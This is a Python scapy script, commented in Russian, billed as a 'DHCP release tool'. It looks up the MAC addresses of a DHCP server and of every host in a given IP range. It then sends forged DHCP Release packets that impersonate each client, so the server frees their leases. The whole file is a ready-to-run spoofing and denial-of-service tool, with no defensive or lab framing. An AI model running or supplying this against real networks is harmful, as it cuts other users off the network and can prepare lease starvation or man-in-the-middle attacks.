import argparse
from scapy.all import *

def parse_arguments() -> argparse.Namespace:
  """Парсер аргументов командной строки"""
  parser = argparse.ArgumentParser(description='DHCP release tool')
  parser.add_argument('--dhcpip', type=str, required=True, help='IP DHCP сервера')
  parser.add_argument('--startip', type=str, required=True, help='Начальный IP клиента')
  parser.add_argument('--endip', type=str, required=True, help='Конечный IP клиента')
  return parser.parse_args()

def get_mac_address(ip: str) -> Optional[str]:
  """Отправляем ARP-запрос DHCP-серверу, чтобы узнать его MAC-адрес"""
  arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
  result = srp1(arp_request, timeout=1, verbose=False)
  if result:
    for received in result:
      if received.haslayer(ARP) and received[ARP].op == 2:
        return received.hwsrc
    return None

def generate_ip_range(start_ip: str, end_ip: str) -> List[str]:
  """Формируем список с IP-адресами"""
  start_host = int(start_ip.split(".")[-1])
  end_host = int(end_ip.split(".")[-1])
  subnet = ".".join(start_ip.split(".")[0:3]) + "."
  return [subnet + str(host) for host in range(start_host, end_host + 1)]

def mac_to_bytes(mac_addr: str) -> bytes:
  """Конвертируем MAC адрес в байты"""
  return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")

def send_dhcp_release(client_mac: str, client_ip: str, server_ip: str, server_mac: str) -> None:
  """Отправляем пакет DHCP Release"""
  xid = random.randint(0x00000000, 0xffffffff)
  release_packet = Ether(src=client_mac, dst=server_mac) / \
    IP(src=client_ip, dst=server_ip) / \
    UDP(sport=68, dport=67) / \
    BOOTP(op=1, chaddr=mac_to_bytes(client_mac), ciaddr=client_ip, xid=xid) / \
    DHCP(options=[
      ("message-type", "release"),
      ("client_id", b'\x01' + bytes.fromhex(client_mac.replace(':', ''))),
      ("server_id", server_ip),
      "end"
    ])
  sendp(release_packet, count=1, verbose=False)

def main():
  args = parse_arguments()

  # Получаем MAC DHCP сервера
  dhcp_server_mac = get_mac_address(args.dhcpip)
  if not dhcp_server_mac:
    print(f"Не найден MAC адрес DHCP сервера {args.dhcpip}")
    return

  print(f"MAC DHCP сервера: {dhcp_server_mac}")

  # Формируем список IP
  ip_range = generate_ip_range(args.startip, args.endip)
  #print("***")
  #print(ip_range)

  # Посылаем пакет от каждого IP
  for ip in ip_range:
    client_mac = get_mac_address(ip)
    if client_mac:
      print(f"IP клиента {ip} MAC адрес: {client_mac}")
      send_dhcp_release(client_mac, ip, args.dhcpip, dhcp_server_mac)
    else:
      print(f"Не найден IP клиента {ip}")

if __name__ == "__main__":
  main()

